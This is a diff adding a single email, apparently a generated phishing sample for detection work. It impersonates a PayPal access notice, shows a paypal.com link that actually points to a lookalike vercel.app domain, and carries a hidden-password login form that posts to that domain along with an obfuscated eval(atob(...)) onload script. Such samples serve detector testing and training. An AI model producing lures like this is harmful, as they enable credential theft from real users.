@@ -1,0 +1,30 @@
+From: notice@secure-paypal.vercel.app
+To: victim33@example.com
+Subject: Access notice from PayPal [ref F26AFD1]
+Date: Tue, 26 Mar 2002 03:34:00 -0500
+Message-ID: <phish-33-7898ed6e-5c46-4b75-95c2-b0831b7d1511@secure-paypal.vercel.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 25 Mar 2002 04:05:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 22 Mar 2002 04:31:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 04 Mar 2002 13:20:00 -0500
+Return-Path: <bounce@mail-8605e7f.top>
+Reply-To: recovery3@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-8605e7f.top; dkim=fail header.d=secure-paypal.vercel.app; dmarc=fail header.from=secure-paypal.vercel.app
+Received-SPF: fail (mx.example.com: domain of notice@secure-paypal.vercel.app does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-paypal.vercel.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-33-17cdaebc"
+
+--bnd-p-33-17cdaebc
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.secure-paypal.vercel.app/auth?t=F26AFD1
+
+Reference: F26AFD1
+--bnd-p-33-17cdaebc
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.secure-paypal.vercel.app/auth?t=F26AFD1<br/><br/>Reference: F26AFD1</p><p><a href="http://secure-paypal.vercel.app/login">https://www.paypal.com/signin</a></p><form action="http://secure-paypal.vercel.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-33-17cdaebc--
